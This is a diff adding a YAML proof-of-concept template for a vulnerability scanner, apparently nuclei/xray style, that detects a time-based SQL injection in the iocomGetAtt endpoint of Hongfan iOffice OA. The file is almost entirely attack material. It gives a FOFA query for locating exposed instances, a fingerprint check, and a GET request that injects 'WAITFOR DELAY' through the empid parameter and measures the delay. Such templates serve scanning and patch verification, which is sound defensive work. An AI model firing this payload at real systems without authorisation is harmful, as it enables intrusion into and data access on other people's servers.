@@ -1,0 +1,29 @@
+id: poc-yaml-hongfan-iOffice-iocomGetAtt-sqli
+info:
+  name: 红帆OA iocomGetAtt SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  t1: random_int(5,7)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /
+  expression: 'status_code == 200 &&
+
+    contains(body,"iOffice.net")
+
+    '
+- method: GET
+  path: /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
